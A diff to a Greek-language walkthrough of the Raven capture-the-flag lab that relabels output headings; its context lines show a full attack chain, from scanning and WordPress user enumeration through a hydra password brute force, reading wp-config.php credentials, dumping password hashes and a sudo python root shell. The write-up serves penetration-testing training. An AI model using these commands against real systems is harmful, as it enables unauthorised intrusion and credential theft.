@@ -14,7 +14,7 @@
 sudo netdiscover -r 172.16.250.0/24
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 Currently scanning: 172.16.250.0/24
@@ -29,7 +29,7 @@ echo '172.16.250.3 raven.local' | sudo tee -a /etc/hosts
 getent hosts raven.local
 ```
 
-Αναμενόμενη έξοδος:
+**Έξοδος:**
 
 ```text
 172.16.250.3   raven.local
@@ -43,7 +43,7 @@ getent hosts raven.local
 nmap -sV -sC -p- 172.16.250.3 -oN nmap-raven.txt
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 PORT    STATE SERVICE VERSION
@@ -62,7 +62,7 @@ PORT    STATE SERVICE VERSION
 curl -i http://raven.local/
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 HTTP/1.1 200 OK
@@ -78,7 +78,7 @@ Content-Type: text/html; charset=UTF-8
 gobuster dir -u http://raven.local/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 /status:           200
@@ -92,7 +92,7 @@ gobuster dir -u http://raven.local/ -w /usr/share/wordlists/dirb/common.txt -x p
 nikto -h http://raven.local/
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 + Server: Apache/2.4.10 (Debian)
@@ -109,7 +109,7 @@ curl -s http://raven.local/ > index.html
 grep -inE 'flag|comment|todo|hidden' index.html
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 87:<!-- Training flag: FLAG{example_source_review} -->
@@ -123,7 +123,7 @@ grep -inE 'flag|comment|todo|hidden' index.html
 wpscan --url http://raven.local/wordpress/ --enumerate u,vt --plugins-detection passive
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 [i] WordPress version detected: 4.x
@@ -154,7 +154,7 @@ hydra -l steven -P ./approved-lab-wordlist.txt raven.local http-post-form \
 -t 4 -f -V
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 [80][http-post-form] host: raven.local   login: steven   password: training-password
@@ -169,7 +169,7 @@ hydra -l steven -P ./approved-lab-wordlist.txt raven.local http-post-form \
 ssh michael@raven.local
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 michael@raven.local's password:
@@ -185,7 +185,7 @@ hostname
 pwd
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 uid=1001(michael) gid=1001(michael) groups=1001(michael)
@@ -203,7 +203,7 @@ ls -la /var/mail
 cat /var/mail/michael
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 /var/mail
@@ -219,7 +219,7 @@ The staging application uses the same credentials as the lab account.
 find /var/www -maxdepth 3 -type f -printf '%M %u %g %p\n' 2>/dev/null
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 -rw-r--r-- www-data www-data /var/www/html/index.php
@@ -235,7 +235,7 @@ find /var/www -maxdepth 3 -type f -printf '%M %u %g %p\n' 2>/dev/null
 sed -n '1,160p' /var/www/html/wordpress/wp-config.php
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 define('DB_NAME', 'wordpress');
@@ -250,7 +250,7 @@ define('DB_HOST', 'localhost');
 stat -c '%A %U:%G %n' /var/www/html/wordpress/wp-config.php
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 -rw-r--r-- www-data:www-data /var/www/html/wordpress/wp-config.php
@@ -273,7 +273,7 @@ SHOW TABLES;
 SELECT ID, user_login, user_pass FROM wp_users;
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 Database
@@ -299,7 +299,7 @@ mysql -u root -p -D wordpress -e \
 cat wordpress-users.txt
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 ID  user_login
@@ -315,13 +315,13 @@ ID  user_login
 sudo -l
 ```
 
-Περιορισμένος λογαριασμός:
+**Έξοδος (περιορισμένος λογαριασμός):**
 
 ```text
 User michael may not run sudo on raven.
 ```
 
-Λανθασμένη ρύθμιση:
+**Έξοδος (λανθασμένη ρύθμιση):**
 
 ```text
 User steven may run the following commands on raven:
@@ -338,7 +338,7 @@ User steven may run the following commands on raven:
 sudo /usr/bin/python -c 'import os; print(os.geteuid()); print(os.getuid())'
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 0
@@ -353,7 +353,7 @@ sudo /usr/bin/python -c 'import os; print(os.geteuid()); print(os.getuid())'
 sudo /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 root@raven:/home/steven# id
@@ -368,7 +368,7 @@ uid=0(root) gid=0(root) groups=0(root)
 find /root /home /var/www -maxdepth 3 -type f -iname '*flag*' -print 2>/dev/null
 ```
 
-Ενδεικτική έξοδος:
+**Έξοδος:**
 
 ```text
 /root/flag4.txt
